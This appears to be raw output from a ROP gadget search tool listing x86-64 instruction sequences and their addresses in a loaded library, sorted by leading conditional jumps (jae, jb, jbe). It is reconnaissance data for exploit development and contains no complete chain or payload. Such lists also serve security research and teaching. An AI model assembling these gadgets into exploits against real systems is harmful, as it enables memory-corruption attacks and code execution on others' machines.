0x00002aaaaac7b991 : jae 0x1a6984 ; call rax
0x00002aaaaac85159 : jae 0x1b0152 ; call qword ptr [rsi]
0x00002aaaaac85189 : jae 0x1b0182 ; jmp qword ptr [rcx]
0x00002aaaaac851b9 : jae 0x1b01b2 ; jmp qword ptr [rcx]
0x00002aaaaac851d1 : jae 0x1b01ca ; jmp qword ptr [rcx]
0x00002aaaaab01b2a : jae 0x2cb46 ; mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaab0a76d : jae 0x35772 ; ret
0x00002aaaaab0ae2d : jae 0x35e32 ; ret
0x00002aaaaab1cb27 : jae 0x47b30 ; xor eax, eax ; ret
0x00002aaaaab3e84c : jae 0x697d9 ; ret 0x348
0x00002aaaaab4036d : jae 0x6b372 ; ret
0x00002aaaaab403a0 : jae 0x6b3a5 ; ret
0x00002aaaaab455c3 : jae 0x705db ; lea rcx, qword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab4574a : jae 0x7076b ; lea rcx, qword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab4e618 : jae 0x79625 ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab502d3 : jae 0x7b287 ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaab502ce : jae 0x7b2eb ; cmp rax, rsi ; jae 0x7b28c ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaab51c4b : jae 0x7cc75 ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab5da9e : jae 0x88aae ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9096d : jae 0xbb972 ; ret
0x00002aaaaab93a5d : jae 0xbea62 ; ret
0x00002aaaaab93a8d : jae 0xbea92 ; ret
0x00002aaaaaba038d : jae 0xcb392 ; ret
0x00002aaaaaba0580 : jae 0xcb585 ; ret
0x00002aaaaaba065d : jae 0xcb662 ; ret
0x00002aaaaaba06e6 : jae 0xcb71b ; ret
0x00002aaaaaba0746 : jae 0xcb77b ; ret
0x00002aaaaaba0b47 : jae 0xcbb4c ; ret
0x00002aaaaaba0bcd : jae 0xcbbd2 ; ret
0x00002aaaaaba16dd : jae 0xcc6e2 ; ret
0x00002aaaaaba187d : jae 0xcc882 ; ret
0x00002aaaaaba18ad : jae 0xcc8b2 ; ret
0x00002aaaaaba190d : jae 0xcc912 ; ret
0x00002aaaaaba193d : jae 0xcc942 ; ret
0x00002aaaaaba196d : jae 0xcc972 ; ret
0x00002aaaaaba199d : jae 0xcc9a2 ; ret
0x00002aaaaaba4056 : jae 0xcf06e ; mov dh, 0x42 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaaba6638 : jae 0xd164f ; add byte ptr [rax + 0x63], cl ; add al, 0x86 ; add rax, rsi ; jmp rax
0x00002aaaaabb512a : jae 0xe0376 ; movdqa xmm0, xmm2 ; jmp 0xe011c
0x00002aaaaabbeb8d : jae 0xe9b92 ; ret
0x00002aaaaabbebbd : jae 0xe9bc2 ; ret
0x00002aaaaabbebed : jae 0xe9bf2 ; ret
0x00002aaaaabbec1d : jae 0xe9c22 ; ret
0x00002aaaaabbec4d : jae 0xe9c52 ; ret
0x00002aaaaabbec7d : jae 0xe9c82 ; ret
0x00002aaaaabbecad : jae 0xe9cb2 ; ret
0x00002aaaaabbecdd : jae 0xe9ce2 ; ret
0x00002aaaaabc9e99 : jae 0xf4ed1 ; ret
0x00002aaaaabc9ef9 : jae 0xf4f31 ; ret
0x00002aaaaabcaf6d : jae 0xf5f72 ; ret
0x00002aaaaabcb20d : jae 0xf6212 ; ret
0x00002aaaaabcb23d : jae 0xf6242 ; ret
0x00002aaaaabcb30d : jae 0xf6312 ; ret
0x00002aaaaabcb33d : jae 0xf6342 ; ret
0x00002aaaaabcb3fd : jae 0xf6402 ; ret
0x00002aaaaabcb42d : jae 0xf6432 ; ret
0x00002aaaaabcb466 : jae 0xf649b ; ret
0x00002aaaaabcb686 : jae 0xf66bb ; ret
0x00002aaaaabcb6e6 : jae 0xf671b ; ret
0x00002aaaaabcb73d : jae 0xf6742 ; ret
0x00002aaaaabcbbcd : jae 0xf6bd2 ; ret
0x00002aaaaabcbd16 : jae 0xf6d4b ; ret
0x00002aaaaabcbd6d : jae 0xf6d72 ; ret
0x00002aaaaabcbd9d : jae 0xf6da2 ; ret
0x00002aaaaabcbdcd : jae 0xf6dd2 ; ret
0x00002aaaaabcbdfd : jae 0xf6e02 ; ret
0x00002aaaaabcbe2d : jae 0xf6e32 ; ret
0x00002aaaaabcbe66 : jae 0xf6e9b ; ret
0x00002aaaaabcbebd : jae 0xf6ec2 ; ret
0x00002aaaaabcbeed : jae 0xf6ef2 ; ret
0x00002aaaaabcc71d : jae 0xf7722 ; ret
0x00002aaaaabcc74d : jae 0xf7752 ; ret
0x00002aaaaabcc77d : jae 0xf7782 ; ret
0x00002aaaaabcc7b0 : jae 0xf77b5 ; ret
0x00002aaaaabccd8d : jae 0xf7d92 ; ret
0x00002aaaaabccdc0 : jae 0xf7dc5 ; ret
0x00002aaaaabccded : jae 0xf7df2 ; ret
0x00002aaaaabcce1d : jae 0xf7e22 ; ret
0x00002aaaaabcce4d : jae 0xf7e52 ; ret
0x00002aaaaabcce80 : jae 0xf7e85 ; ret
0x00002aaaaabccead : jae 0xf7eb2 ; ret
0x00002aaaaabccedd : jae 0xf7ee2 ; ret
0x00002aaaaabccf0d : jae 0xf7f12 ; ret
0x00002aaaaabcfb46 : jae 0xfab7b ; ret
0x00002aaaaabcfbd4 : jae 0xfac27 ; add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcfeb0 : jae 0xfaeb5 ; ret
0x00002aaaaabd0629 : jae 0xfb661 ; ret
0x00002aaaaabd0d7d : jae 0xfbd82 ; ret
0x00002aaaaabd0dad : jae 0xfbdb2 ; ret
0x00002aaaaabd0ddd : jae 0xfbde2 ; ret
0x00002aaaaabd117d : jae 0xfc182 ; ret
0x00002aaaaabd135d : jae 0xfc362 ; ret
0x00002aaaaabd1396 : jae 0xfc3cb ; ret
0x00002aaaaabd13f6 : jae 0xfc42b ; ret
0x00002aaaaabd18ed : jae 0xfc8f2 ; ret
0x00002aaaaabd198d : jae 0xfc992 ; ret
0x00002aaaaabd19c9 : jae 0xfca01 ; ret
0x00002aaaaabd1b1d : jae 0xfcb22 ; ret
0x00002aaaaabd1b4d : jae 0xfcb52 ; ret
0x00002aaaaabd1b86 : jae 0xfcbbb ; ret
0x00002aaaaabd1bdd : jae 0xfcbe2 ; ret
0x00002aaaaabd1c16 : jae 0xfcc4b ; ret
0x00002aaaaabd1c6d : jae 0xfcc72 ; ret
0x00002aaaaabd1fdd : jae 0xfcfe2 ; ret
0x00002aaaaabd200d : jae 0xfd012 ; ret
0x00002aaaaabd203d : jae 0xfd042 ; ret
0x00002aaaaabd358d : jae 0xfe592 ; ret
0x00002aaaaabd35bd : jae 0xfe5c2 ; ret
0x00002aaaaabf6a55 : jae 0xffffffff835a1c22 ; ret 0x3904
0x00002aaaaab0541d : jae 0xffffffff894b0462 ; ret
0x00002aaaaabd8a32 : jb 0x1039f9 ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabdde13 : jb 0x108e28 ; seta al ; movzx eax, al ; neg eax ; ret
0x00002aaaaabdef90 : jb 0x109fac ; lea rdx, qword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaabdefeb : jb 0x10a007 ; lea rdx, qword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaabdf812 : jb 0x10a82e ; lea rdx, qword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaabdf85f : jb 0x10a87b ; lea rdx, qword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaabe2ddb : jb 0x10ddef ; mov eax, 1 ; ret
0x00002aaaaabe8ddd : jb 0x113dd4 ; xor eax, eax ; ret
0x00002aaaaabf79c8 : jb 0x1229eb ; cmp eax, edx ; jne 0x1229ab ; mov qword ptr [rsi], rcx ; xor eax, eax ; ret
0x00002aaaaabf82d8 : jb 0x1232cb ; mov eax, 0xffffffff ; ret
0x00002aaaaabf82d7 : jb 0x1232cc ; mov eax, 0xffffffff ; ret
0x00002aaaaac02c01 : jb 0x12dc25 ; ret
0x00002aaaaac02bfb : jb 0x12dc2d ; ja 0x12dbf0 ; mov qword ptr [rdx + 0x20], rsi ; ret
0x00002aaaaac0c62a : jb 0x13763d ; sub dword ptr [rax], eax ; mov qword ptr fs:[rax], rdx ; ret
0x00002aaaaac0ff47 : jb 0x13af73 ; cmp eax, 2 ; sete al ; movzx eax, al ; ret
0x00002aaaaac0ff87 : jb 0x13afb3 ; cmp eax, 2 ; sete al ; movzx eax, al ; ret
0x00002aaaaac21e81 : jb 0x14ce6a ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac21ee4 : jb 0x14cecd ; vmovdqu xmmword ptr [rdx - 0x10], xmm7 ; ret
0x00002aaaaac21f88 : jb 0x14cf94 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac22371 : jb 0x14d35a ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac223d4 : jb 0x14d3bd ; vmovdqu xmmword ptr [rdx - 0x10], xmm7 ; ret
0x00002aaaaac22478 : jb 0x14d484 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac22714 : jb 0x14d6fd ; vmovdqu xmmword ptr [rdx - 0x10], xmm15 ; ret
0x00002aaaaac22774 : jb 0x14d75d ; vmovdqu xmmword ptr [rdx - 0x10], xmm7 ; ret
0x00002aaaaac22818 : jb 0x14d824 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac2594c : jb 0x150966 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac259fa : jb 0x150a0a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25a9c : jb 0x150ab6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac25b4a : jb 0x150b5a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25bec : jb 0x150c06 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac25c9a : jb 0x150caa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25d3c : jb 0x150d56 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac25dea : jb 0x150dfa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25e8c : jb 0x150ea6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac25f3a : jb 0x150f4a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac25fdc : jb 0x150ff6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2608a : jb 0x15109a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2612c : jb 0x151146 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac261da : jb 0x1511ea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2627a : jb 0x15129b ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2632a : jb 0x15133a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac263cc : jb 0x1513e6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2647a : jb 0x15148a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2651c : jb 0x151536 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac265ca : jb 0x1515da ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2666c : jb 0x151686 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2671a : jb 0x15172a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac267bc : jb 0x1517d6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2686a : jb 0x15187a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2690c : jb 0x151926 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac269ba : jb 0x1519ca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26a5c : jb 0x151a76 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac26b0a : jb 0x151b1a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac26bac : jb 0x151bc6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac26c5a : jb 0x151c6a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2831c : jb 0x153336 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac283ca : jb 0x1533da ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2846c : jb 0x153486 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2851a : jb 0x15352a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac285bc : jb 0x1535d6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2866a : jb 0x15367a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2870c : jb 0x153726 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac287ba : jb 0x1537ca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2885c : jb 0x153876 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2890a : jb 0x15391a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac289ac : jb 0x1539c6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac28a5a : jb 0x153a6a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28afc : jb 0x153b16 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac28baa : jb 0x153bba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28c4a : jb 0x153c6b ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac28cfa : jb 0x153d0a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28d9c : jb 0x153db6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac28e4a : jb 0x153e5a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac28eec : jb 0x153f06 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac28f9a : jb 0x153faa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2903c : jb 0x154056 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac290ea : jb 0x1540fa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2918c : jb 0x1541a6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2923a : jb 0x15424a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac292dc : jb 0x1542f6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2938a : jb 0x15439a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2942c : jb 0x154446 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac294da : jb 0x1544ea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2957c : jb 0x154596 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2962a : jb 0x15463a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2acec : jb 0x155d06 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2ad9a : jb 0x155daa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2ae3c : jb 0x155e56 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2aeea : jb 0x155efa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2af8c : jb 0x155fa6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b03a : jb 0x15604a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b0dc : jb 0x1560f6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b18a : jb 0x15619a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b22c : jb 0x156246 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b2da : jb 0x1562ea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b37c : jb 0x156396 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b42a : jb 0x15643a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b4cc : jb 0x1564e6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b57a : jb 0x15658a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b61a : jb 0x15663b ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b6ca : jb 0x1566da ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b76c : jb 0x156786 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b81a : jb 0x15682a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2b8bc : jb 0x1568d6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2b96a : jb 0x15697a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2ba0c : jb 0x156a26 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2baba : jb 0x156aca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bb5c : jb 0x156b76 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2bc0a : jb 0x156c1a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bcac : jb 0x156cc6 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2bd5a : jb 0x156d6a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bdfc : jb 0x156e16 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2beaa : jb 0x156eba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac2bf4c : jb 0x156f66 ; movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac2bffa : jb 0x15700a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaac4140a : jb 0x16c419 ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac46e63 : jb 0x171e7b ; vmovq qword ptr [rdi], xmm0 ; vmovq qword ptr [rsi - 8], xmm0 ; ret
0x00002aaaaac46e77 : jb 0x171e87 ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x00002aaaaac46e83 : jb 0x171e99 ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaac46e93 : jb 0x171e9b ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac487bb : jb 0x1737b1 ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaac49559 : jb 0x174558 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac49c8d : jb 0x174c80 ; call qword ptr [rax - 0x2f00148e]
0x00002aaaaac49c91 : jb 0x174c80 ; call rax
0x00002aaaaac49ca5 : jb 0x174c94 ; call rax
0x00002aaaaac56f54 : jb 0x181f8b ; pop rbx ; cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaac5d488 : jb 0x188469 ; call qword ptr [rcx]
0x00002aaaaac6a634 : jb 0x1955eb ; cld ; inc dword ptr [rdx] ; stosb byte ptr [rdi], al ; cld ; call qword ptr [rdx + 0x22fffca9]
0x00002aaaaac6c1a9 : jb 0x19719b ; call rsp
0x00002aaaaac85081 : jb 0x1b007a ; jmp qword ptr [rcx]
0x00002aaaaac850b1 : jb 0x1b00aa ; jmp qword ptr [rcx]
0x00002aaaaac850c9 : jb 0x1b00c2 ; jmp qword ptr [rcx]
0x00002aaaaac85111 : jb 0x1b010a ; jmp qword ptr [rcx]
0x00002aaaaac8adc6 : jb 0x1b5dd4 ; ret
0x00002aaaaac8adc6 : jb 0x1b5dda ; ret
0x00002aaaaaad7b80 : jb 0x2b20 ; test word ptr [rbx - 0x2e], bp ; cmp dl, byte ptr [rdi] ; ret
0x00002aaaaab02a7e : jb 0x2da8b ; ret
0x00002aaaaaad88ee : jb 0x396e ; cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaaad8af4 : jb 0x3ad1 ; clc ; cmp eax, ecx ; mov bl, 0xf7 ; adc bh, byte ptr [rax] ; cwde ; ret
0x00002aaaaab46275 : jb 0x7129b ; mov dword ptr [rcx], eax ; ret
0x00002aaaaab47d5c : jb 0x72d55 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab4c834 : jb 0x7786b ; mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rsi], rax ; xor eax, eax ; ret
0x00002aaaaab4cbb4 : jb 0x77ba9 ; mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rsi], rax ; xor eax, eax ; ret
0x00002aaaaab574be : jb 0x824a2 ; mov byte ptr [r8 + rbx], r9b ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaab7400e : jb 0x9f01a ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab74761 : jb 0x9f76d ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab74eae : jb 0x9feba ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7b36d : jb 0xa5934 ; movdqu xmmword ptr [rdi + 0x30], xmm7 ; ret
0x00002aaaaab7c11a : jb 0xa7129 ; add byte ptr [rax], al ; ret
0x00002aaaaab7ea19 : jb 0xa9a30 ; vmovdqu ymmword ptr [rdi], ymm2 ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x00002aaaaab7ea32 : jb 0xa9a49 ; vmovq qword ptr [rdi], xmm0 ; vmovq qword ptr [rsi - 8], xmm0 ; ret
0x00002aaaaab7ea45 : jb 0xa9a54 ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x00002aaaaab7ea50 : jb 0xa9a63 ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaab7ea5d : jb 0xa9a65 ; mov byte ptr [rdi], cl ; ret
0x00002aaaaaba1fed : jb 0xccff6 ; add byte ptr [rbp - 0x27], dh ; xor eax, eax ; ret
0x00002aaaaabab73d : jb 0xd66bd ; pop rbx ; ret
0x00002aaaaabbeddb : jb 0xe9df0 ; setne al ; movzx eax, al ; neg eax ; ret
0x00002aaaaabc7c1b : jb 0xf2c30 ; add byte ptr [rax + 0x63], cl ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaabda1e4 : jbe 0x1051e8 ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rcx + rdi*2 + 0x48], 0x39 ; ret
0x00002aaaaac021b3 : jbe 0x12d1c7 ; mov eax, 2 ; ret
0x00002aaaaac105ed : jbe 0x13b609 ; add dword ptr [rdi + 0x28], esi ; mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaac32f07 : jbe 0x15df17 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac3314a : jbe 0x15e15a ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac693b0 : jbe 0x194355 ; std ; jmp qword ptr [rdx]
0x00002aaaaac69359 : jbe 0x19435c ; jmp qword ptr [rax + 0x20fffb77]
0x00002aaaaac69bac : jbe 0x194c18 ; cld ; inc dword ptr [rsi] ; pop rdi ; cld ; call qword ptr [rsi + 0x26fffc5e]
0x00002aaaaac6a090 : jbe 0x195016 ; cld ; jmp rsi
0x00002aaaaac6a098 : jbe 0x19502c ; cld ; inc dword ptr [rsi] ; xchg esp, edi ; call qword ptr [rsi + 0x26fffc86]
0x00002aaaaac6af95 : jbe 0x195f9d ; add byte ptr [rbp + rbp*8 - 0x17], dl ; call rsp
0x00002aaaaac6d68d : jbe 0x198696 ; add ah, ah ; or al, 0xf6 ; call rsp
0x00002aaaaac6da51 : jbe 0x198a53 ; dec esp ; mov dword ptr [rcx], eax ; add byte ptr [rsi + rsi*2 - 0xa], dh ; jmp rsp
0x00002aaaaac6da59 : jbe 0x198a53 ; jmp rsp
0x00002aaaaac6da50 : jbe 0x198a54 ; dec esp ; mov dword ptr [rcx], eax ; add byte ptr [rsi + rsi*2 - 0xa], dh ; jmp rsp
0x00002aaaaac85321 : jbe 0x1b031a ; jmp qword ptr [rcx]
0x00002aaaaac85339 : jbe 0x1b0332 ; jmp qword ptr [rcx]
0x00002aaaaab00767 : jbe 0x2b771 ; add byte ptr [rbx - 0x76be0008], al ; ret
0x00002aaaaaad7c0f : jbe 0x2be3 ; clc ; ret
0x00002aaaaab1cf4b : jbe 0x47fc1 ; xor eax, eax ; ret
0x00002aaaaab1f49c : jbe 0x4a496 ; nop ; pop rbx ; ret
0x00002aaaaab283bf : jbe 0x5334c ; ret 0x8166
0x00002aaaaab4728a : jbe 0x72200 ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaab62fb6 : jbe 0x8dff5 ; add rax, rdi ; ret
0x00002aaaaab62fc6 : jbe 0x8dff7 ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab62fd6 : jbe 0x8dff7 ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
